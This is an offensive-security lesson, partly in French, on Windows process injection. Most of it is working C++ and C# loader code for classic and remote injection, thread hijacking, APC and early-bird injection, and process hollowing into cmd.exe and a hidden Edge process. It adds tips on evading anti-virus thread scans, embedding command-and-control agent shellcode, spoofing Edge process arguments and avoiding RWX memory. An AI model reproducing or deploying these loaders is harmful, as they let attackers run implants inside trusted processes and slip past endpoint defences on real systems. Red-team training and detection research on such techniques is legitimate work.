
Process injection is described by MITRE [[T1055](https://attack.mitre.org/techniques/T1055/)] as a privilege escalation and defence evasion technique.  The idea of which is to inject untrusted code into the address space of a trusted process, potentially bypassing defence solutions and allowing the code to inherit the security context of the process's owner.  There are many different techniques, some more sophisticated than others.  The aim of this lesson is to introduce you to some of the more straight-forward ones to get you familiar with the concept.  

The high-level steps required for process injection to be successful are to:

- Allocate a new region of memory in the process.
- Copy the shellcode into that region.
- Execute the shellcode (typically with a thread).
# Classic injection

Perhaps the most vanilla form of process injection uses the VirtualAlloc, WriteProcessMemory, and CreateThread APIs.  This will inject and execute the shellcode in the running process.

```cpp
#include <Windows.h>

int main()
{
    unsigned char shellcode[] = "..."; // your shellcode goes here

    // allocate a region of memory
    auto hMemory = VirtualAlloc(
        NULL,                       // we don't mind where it's allocated
        sizeof(shellcode),          // the size of memory region
        MEM_COMMIT | MEM_RESERVE,   // type of memory allocation
        PAGE_EXECUTE_READWRITE      // memory protection
    );
    
    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        GetCurrentProcess(),    // handle to target process
        hMemory,                // pointer to target memory region
        &shellcode,             // pointer to data to write
        sizeof(shellcode),      // length of data to write
        &bytesWritten           // receives the number of bytes written
    );

    // create a new thread
    DWORD threadId = 0;
    auto hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)hMemory,  // a pointer to the thing to execute
        NULL,
        0,
        &threadId                         // receives the new thread ID
    );

    // wait for the thread to finish
    WaitForSingleObject(
        hThread,    // the handle to wait on
        INFINITE    // the length of time to wait
    );
    
    // close the thread handle
    CloseHandle(hThread);
}
```
# Classic remote injection

The same style of injection can be used on other processes as well.  An additional step is required where we must obtain a handle to the target process by its process ID (PID).

```cpp
#include <Windows.h>

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "...";

    // convert the provided argument to an integer
    auto pid = atoi(argv[1]);

    // get handle to process
    auto hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, // desired access level
        FALSE,
        pid                 // target process ID
    );

    // sanity check the handle is valid
    if (hProcess == NULL) {
        return 0;
    }

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        hProcess,   // handle to target process
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // create a new thread
    DWORD threadId = 0;
    auto hThread = CreateRemoteThread(
        hProcess,   // handle to target process
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)hMemory,
        NULL,
        0,
        &threadId
    );

    // wait for the thread to finish
    WaitForSingleObject(
        hThread,
        INFINITE
    );
    
    // close the thread handle
    CloseHandle(hThread);
}
```
# Thread hijacking

In the examples above, the new threads are pointing to our shellcode when they are created.  Anti-virus solutions can receive notifications when new threads are created and are able to inspect the memory the thread is pointing to.  If they find the thread is pointing to shellcode, it can block the new thread from starting and raise an alert.  A possible workaround for this is to create the thread in a suspended state but pointing to a benign location.  After some time (hopefully after the anti-virus has scanned the memory region), the context of the thread can be changed to point at the shellcode and resumed.

```cpp
#include <Windows.h>

void dummy() {
    // do nothing
}

int main()
{
    unsigned char shellcode[] = "...";

    // allocate a region of memory
    auto hMemory = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        GetCurrentProcess(),
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // create a suspended thread pointing at a dummy function
    DWORD threadId = 0;
    auto hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)&dummy,
        NULL,
        CREATE_SUSPENDED,
        &threadId
    );

    // little sleep
    Sleep(5 * 1000);

    // get current thread's context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;

    GetThreadContext(hThread, &ctx);

    // point thread context at shellcode
    ctx.Rip = (DWORD64)hMemory;
    SetThreadContext(hThread, &ctx);

    // resume the thread
    ResumeThread(hThread);

    // wait on thread
    WaitForSingleObject(hThread, INFINITE);

    // close handle
    CloseHandle(hThread);
}
```

A similar variant of thread hijacking can be performed where you enumerate all of the running threads in a process, suspend one of them, change its context and then resume it.  This isn't generally recommended though, because you'll break whatever functionality that thread was performing and potentially crash the process.

# Asynchronous Procedure Calls

This technique is similar to above but instead of creating a new thread, we queue an [asynchronous procedure call](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls) on an existing thread.  When the thread enters an 'alertable' state (e.g. when it calls an API like Sleep or WaitForSingleObject), it will run the shellcode that the APC points to.  Queuing an APC on a thread requires that we have a handle to it, and for that we need a thread ID.  To obtain a valid thread ID from a process, we must 'thread walk' it.

```cpp
#include <Windows.h>
#include <tlhelp32.h>

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "...";

    // convert the provided argument to an integer
    auto pid = atoi(argv[1]);

    DWORD threadId = 0;

    // create thread snapshot
    auto hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPTHREAD,
        0
    );

    THREADENTRY32 te = { 0 };
    te.dwSize = sizeof(te);

    // walk the threads
    Thread32First(hSnapshot, &te);

    do {
        if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)) {
            if (te.th32OwnerProcessID == pid) {
                // use the first thread we find
                threadId = te.th32ThreadID;
                break;
            }
        }
        te.dwSize = sizeof(te);
    } while (Thread32Next(hSnapshot, &te));

    if (threadId == 0) {
        // we failed to find a thread
        return 0;
    }

    // get a handle to the process
    auto hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // open handle to target thread
    auto hThread = OpenThread(
        THREAD_ALL_ACCESS,
        FALSE,
        threadId
    );

  	// queue the apc
    QueueUserAPC(
        (PAPCFUNC)hMemory,  // target function
        hThread,            // target thread
        0
    );
}
```
# Early bird

The downside with the APC method is that there's no guarantee that the selected thread will become alertable, and therefore the shellcode will not run.  You could queue an APC on every thread in the process, but that would almost certainly lead to a crash.  The 'early bird' technique gets around this by spawning a new process in a suspended state, queuing the APC on its primary thread, then resuming the process.  This way, the APC is guaranteed to trigger.

```cpp
#include <Windows.h>

int main()
{
    unsigned char shellcode[] = "...";

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    CreateProcessW(
        L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    );

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        pi.hProcess,    // handle to newly spawned process
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        pi.hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // queue the apc
    QueueUserAPC(
        (PAPCFUNC)hMemory,
        pi.hThread,
        0
    );

    // resume the process
    ResumeThread(pi.hThread);

    // tidy up our handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```

# Process Hollowing

This is a technique where a process is started in a suspended state, the original PE is unmapped from memory, and a new PE mapped in its place.  A half-way house to process hollowing is where we simply overwrite the PE's entry point with shellcode, without unmapping anything first.  When the process is resumed, the process's primary thread will be pointing at our shellcode instead of the PE's executable code section.

Finding the PE's entry point requires us to read its structure from memory while it's suspended.  There's a native API called [NtQueryInformationProcess](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess) which is able to populate a structure called `PROCESS_BASIC_INFORMATION`.  One of its members is _PebBaseAddress_ which is a pointer to a [PEB](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb) structure.  It's not documented, but one of its members is _ImageBaseAddress_.

From there, we can read PE's DOS header to get the value for `e_lfanew`, and then use that to locate the NT header.  Drilling down into `OptionalHeader->AddressOfEntryPoint` gives us the relative virtual address (RVA) of the PE's entry point.

```cpp
#include <Windows.h>
#include <winternl.h>

// MSVC uniquement - ignoré par g++. Avec g++, utiliser: g++ ... -lntdll
#pragma comment(lib, "ntdll.lib")

int main()
{
    unsigned char shellcode[] = "...";

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    CreateProcessW(
        L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    );

    // get the process information to find the address of the PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength;
    NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    // the image base address is always at PEB + 0x10 for x64
    auto lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);

    // read the base address (addresses are 8 bytes for x64)
    LPVOID baseAddress = 0;
    SIZE_T bytesRead = 0;
    ReadProcessMemory(
        pi.hProcess,
        lpBaseAddress,
        &baseAddress,
        8,
        &bytesRead
    );

    // now we can read the dos header
    IMAGE_DOS_HEADER dHeader = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        baseAddress,
        &dHeader,
        sizeof(dHeader),
        &bytesRead
    );

    // use e_lfanew to calculate pointer to nt header
    auto lpNtHeader = (LPVOID)((DWORD64)baseAddress + dHeader.e_lfanew);

    // read the nt header
    IMAGE_NT_HEADERS ntHeaders = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        lpNtHeader,
        &ntHeaders,
        sizeof(ntHeaders),
        &bytesRead
    );

    // calculate the entry point address
    auto entryPoint = (LPVOID)((DWORD64)baseAddress + ntHeaders.OptionalHeader.AddressOfEntryPoint);

    // write shellcode to this location, overwriting the PE
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        pi.hProcess,
        entryPoint,
        shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // resume the process
    ResumeThread(pi.hThread);
}
```


# Process Hollowing + jmp

```cpp
#include <Windows.h>
#include <winternl.h>
#include "shellcode.h"

// MSVC uniquement - ignoré par g++. Avec g++, utiliser: g++ ... -lntdll
// #pragma comment(lib, "ntdll.lib")

int main()
{
    unsigned char* shellcode = agent_x64_bin;
    unsigned int shellcode_len = agent_x64_bin_len;

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    CreateProcessW(
        L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    );

    // get the process information to find the address of the PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength;
    NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    // the image base address is always at PEB + 0x10 for x64
    auto lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);

    // read the base address (addresses are 8 bytes for x64)
    LPVOID baseAddress = 0;
    SIZE_T bytesRead = 0;
    ReadProcessMemory(
        pi.hProcess,
        lpBaseAddress,
        &baseAddress,
        8,
        &bytesRead
    );

    // now we can read the dos header
    IMAGE_DOS_HEADER dHeader = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        baseAddress,
        &dHeader,
        sizeof(dHeader),
        &bytesRead
    );

    // use e_lfanew to calculate pointer to nt header
    auto lpNtHeader = (LPVOID)((DWORD64)baseAddress + dHeader.e_lfanew);

    // read the nt header
    IMAGE_NT_HEADERS ntHeaders = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        lpNtHeader,
        &ntHeaders,
        sizeof(ntHeaders),
        &bytesRead
    );

    // calculate the entry point address
    auto entryPoint = (LPVOID)((DWORD64)baseAddress + ntHeaders.OptionalHeader.AddressOfEntryPoint);

    // le shellcode (~100KB+) dépasse l'espace disponible dans la section .text depuis
    // l'entry point, on alloue donc une région séparée pour le shellcode complet
    auto hMemory = VirtualAllocEx(
        pi.hProcess,
        NULL,
        shellcode_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        pi.hProcess,
        hMemory,
        shellcode,
        shellcode_len,
        &bytesWritten
    );

    // l'entry point est en PAGE_EXECUTE_READ, on le rend temporairement écrivable
    // pour y placer le trampoline
    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, entryPoint, 12, PAGE_EXECUTE_READWRITE, &oldProtect);

    // trampoline 12 bytes : redirige le thread vers hMemory dès son démarrage
    //
    //   48 B8 [xx xx xx xx xx xx xx xx]   mov rax, <adresse hMemory>
    //   FF E0                             jmp rax
    //
    // on ne peut pas utiliser un JMP relatif 5-bytes (E9) car la distance entre
    // l'entry point et hMemory dépasse 2GB sur x64 - mov+jmp absolu est nécessaire
    unsigned char trampoline[12] = {
        0x48, 0xB8,                                          // mov rax,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // <adresse 8 bytes>
        0xFF, 0xE0                                           // jmp rax
    };
    *(LPVOID*)(trampoline + 2) = hMemory;  // patch les 8 bytes avec l'adresse réelle

    WriteProcessMemory(pi.hProcess, entryPoint, trampoline, sizeof(trampoline), &bytesWritten);

    // restaurer les permissions originales
    VirtualProtectEx(pi.hProcess, entryPoint, 12, oldProtect, &oldProtect);

    // resume the process - le thread démarre à l'entry point,
    // exécute le trampoline, et saute vers le shellcode
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```

# Process Hollowing C#

```cs
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace AppDomainHijack
{
    public sealed class DomainManager : AppDomainManager
    {
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
            var si = new STARTUPINFOA
            {
                cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
                dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
            };

            // create hidden + suspended msedge process
            var success = CreateProcessA(
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\",
                ref si,
                out var pi);

            if (!success)
                return;

            // get basic process information
            var szPbi = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
            var lpPbi = Marshal.AllocHGlobal(szPbi);

            NtQueryInformationProcess(
                pi.hProcess,
                PROCESSINFOCLASS.ProcessBasicInformation,
                lpPbi,
                (uint)szPbi,
                out _);

            // marshal data to structure
            var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(lpPbi);
            Marshal.FreeHGlobal(lpPbi);

            // calculate pointer to image base address
            var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;

            // buffer to hold data, 64-bit addresses are 8 bytes
            var bImageBaseAddress = new byte[8];

            // read data from spawned process
            ReadProcessMemory(
                pi.hProcess,
                lpImageBaseAddress,
                bImageBaseAddress,
                8,
                out _);

            // convert address bytes to pointer
            var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);

            // read pe headers
            var data = new byte[512];

            ReadProcessMemory(
                pi.hProcess,
                baseAddress,
                data,
                512,
                out _);

            // read e_lfanew
            var e_lfanew = BitConverter.ToInt32(data, 0x3C);

            // calculate rva
            var rvaOffset = e_lfanew + 0x28;
            var rva = BitConverter.ToUInt32(data, rvaOffset);

            // calculate address of entry point
            var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);

            // read the shellcode
            byte[] shellcode;

            var assembly = Assembly.GetExecutingAssembly();

            using (var rs = assembly.GetManifestResourceStream("AppDomainHijack.http_x64.xprocess.bin"))
            {
                // convert stream to raw byte[]
                using (var ms = new MemoryStream())
                {
                    rs.CopyTo(ms);
                    shellcode = ms.ToArray();
                }
            }

            // copy shellcode into address of entry point
            WriteProcessMemory(
                pi.hProcess,
                lpEntryPoint,
                shellcode,
                shellcode.Length,
                out _);

            // resume process
            ResumeThread(pi.hThread);
        }

        // =====================================================================
        // P/INVOKE DECLARATIONS - ÉQUIVALENT DE #include <Windows.h> EN C++
        //
        // En C++, une seule ligne "#include <Windows.h>" suffit pour avoir accès
        // à toutes ces fonctions Win32. En C#, il n'existe pas d'équivalent :
        // chaque fonction doit être déclarée manuellement avec [DllImport] pour
        // indiquer au CLR dans quelle DLL elle se trouve et quelle est sa signature.
        // =====================================================================

        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool CreateProcessA(
            string applicationName,
            string commandLine,
            IntPtr processAttributes,
            IntPtr threadAttributes,
            bool inheritHandles,
            PROCESS_CREATION_FLAGS creationFlags,
            IntPtr environment,
            string currentDirectory,
            ref STARTUPINFOA startupInfo,
            out PROCESS_INFORMATION processInformation);

        [DllImport("ntdll.dll", ExactSpelling = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern uint NtQueryInformationProcess(
            IntPtr processHandle,
            PROCESSINFOCLASS processInformationClass,
            IntPtr processInformation,
            uint processInformationLength,
            out uint returnLength);

        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool ReadProcessMemory(
            IntPtr processHandle,
            IntPtr baseAddress,
            byte[] buffer,
            UInt64 size,
            out uint numberOfBytesRead);

        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool WriteProcessMemory(
            IntPtr processHandle,
            IntPtr baseAddress,
            byte[] buffer,
            int size,
            out int numberOfBytesWritten);

        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern uint ResumeThread(IntPtr threadHandle);
    }

    // =====================================================================
    // TYPES WIN32 - ÉQUIVALENT DES STRUCTS/ENUMS DE <Windows.h> EN C++
    //
    // En C++, PROCESS_CREATION_FLAGS, STARTUPINFOA, PROCESS_INFORMATION, etc.
    // sont déjà définis dans les headers Windows SDK. En C#, il faut les
    // redéfinir manuellement avec la même disposition mémoire (layout) pour
    // que le marshaling P/Invoke fonctionne correctement.
    // =====================================================================

    [Flags]
    public enum PROCESS_CREATION_FLAGS : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_SECURE_PROCESS = 0x00400000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
    }

    public struct STARTUPINFOA
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public STARTUPINFO_FLAGS dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [Flags]
    public enum STARTUPINFO_FLAGS : uint
    {
        STARTF_FORCEONFEEDBACK = 0x00000040,
        STARTF_FORCEOFFFEEDBACK = 0x00000080,
        STARTF_PREVENTPINNING = 0x00002000,
        STARTF_RUNFULLSCREEN = 0x00000020,
        STARTF_TITLEISAPPID = 0x00001000,
        STARTF_TITLEISLINKNAME = 0x00000800,
        STARTF_UNTRUSTEDSOURCE = 0x00008000,
        STARTF_USECOUNTCHARS = 0x00000008,
        STARTF_USEFILLATTRIBUTE = 0x00000010,
        STARTF_USEHOTKEY = 0x00000200,
        STARTF_USEPOSITION = 0x00000004,
        STARTF_USESHOWWINDOW = 0x00000001,
        STARTF_USESIZE = 0x00000002,
        STARTF_USESTDHANDLES = 0x00000100
    }

    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    public enum PROCESSINFOCLASS
    {
        ProcessBasicInformation = 0
    }

    public struct PROCESS_BASIC_INFORMATION
    {
        public uint ExitStatus;
        public IntPtr PebBaseAddress;
        public ulong AffinityMask;
        public int BasePriority;
        public ulong UniqueProcessId;
        public ulong InheritedFromUniqueProcessId;
    }
}
```
# ShellCode integration

**1. Lire depuis un .bin au runtime (remplace la ligne)**

```cpp
FILE* f = fopen("out.x64.bin", "rb");
fseek(f, 0, SEEK_END);
size_t len = ftell(f);
rewind(f);
unsigned char* shellcode = (unsigned char*)malloc(len);
fread(shellcode, 1, len, f);
fclose(f);
// utilise shellcode et len exactement comme avant
```

**2. Garder le format embarqué, générer depuis un .bin**

```bash
sudo apt install xxd
xxd -i agent.x64.bin > shellcode.h
xxd -i agent.x64.bin | tr -s ' \n' ' ' > shellcode.h
```

Sortie :

```cpp
unsigned char agent_x64_bin[] = { 0x4d, 0x5a, ... };
unsigned int agent_x64_bin_len = 1234;
```

Intégration pratique :

```cpp
#include "shellcode.h"

unsigned char* shellcode = agent_x64_bin;
unsigned int shellcode_len = agent_x64_bin_len;
```

Remplacements :

** `sizeof` sur un pointeur**
```cpp
unsigned char* shellcode = agent_x64_bin;
sizeof(shellcode); // retourne 8, taille d'un pointeur x64

// sizeof(shellcode) -> shellcode_len
```

Quand `shellcode` est un pointeur, `sizeof` donne la taille du pointeur et non du buffer. Il faut utiliser `agent_x64_bin_len` fourni par `xxd`.

**`&shellcode` dans WriteProcessMemory**
```cpp
&shellcode // adresse du pointeur lui-même, pas des données
shellcode  // adresse des données, c'est ce qu'il faut

// &shellcode -> shellcode
```

`WriteProcessMemory` écrivait l'adresse du pointeur (8 bytes) dans la mémoire allouée au lieu du shellcode réel. Le thread s'exécutait sur des données invalides, aucun callback.


# Edge

```cpp
CreateProcessW(
	L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
	(LPWSTR)L"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=gpu-process",
	NULL,
	NULL,
	FALSE,
	CREATE_SUSPENDED,
	NULL,
	L"C:\\Windows\\System32",
	&si,
	&pi
);
```

# RWX

Mettre RW, écrire dans la mémoire, puis passer en RX pour éxécuter
```cpp
// allocate a region of memory
auto hMemory = VirtualAllocEx(
	pi.hProcess,    // handle to newly spawned process
	NULL,
	shellcode_len,
	MEM_COMMIT | MEM_RESERVE,
	PAGE_READWRITE
);

// write the shellcode into memory
SIZE_T bytesWritten = 0;
WriteProcessMemory(
	pi.hProcess,
	hMemory,
	shellcode,
	shellcode_len,
	&bytesWritten
);

// flip to RX — never writable and executable at the same time
DWORD oldProtect;
VirtualProtectEx(pi.hProcess, hMemory, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);

```